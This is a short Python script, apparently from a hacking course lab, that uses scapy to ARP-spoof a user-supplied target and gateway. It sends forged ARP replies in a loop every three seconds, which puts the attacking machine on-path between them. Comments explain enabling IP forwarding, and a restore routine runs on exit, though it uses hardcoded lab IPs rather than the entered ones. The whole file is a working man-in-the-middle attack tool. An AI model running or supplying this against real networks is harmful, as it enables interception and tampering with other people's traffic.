#!/usr/bin/env python

import scapy.all as scapy
import time

# On the On-Path machine, use command: echo 1 > /proc/sys/net/ipv4/ip_forward
# --> to enable the target machine to send and receive packets and responses
# if echo 0 --> disables it 



'''Gets the MAC for a specific IP'''



def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)  # set the arp request to the parameter ip
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # create an ethernet object
    arp_req_broadcast = broadcast / arp_request  # combining both packets into one
    answered_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]  # sends the packet and returns the answer
    return answered_list[0][1].hwsrc


'''Sends an ARP response to the target IP pretending to be the spoofed IP -> poisoning its ARP table'''



def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)



'''Restores the ARP tables of the target and the spoofed'''



def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = input("Select a target IP: ")
gateway_ip = input("Input the spoofed IP (Gateway_ip can be found through 'route -n' command): ")
packet_counter = 0
try:
    print("Stop spoofing using CTRL + C")
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packet_counter += 2
        print("\r[+]Sent " + str(packet_counter) + " packets", end="")
        time.sleep(3)
except KeyboardInterrupt:
    restore("10.0.2.7", "10.0.2.1")
    print("\n[+]Stopped")


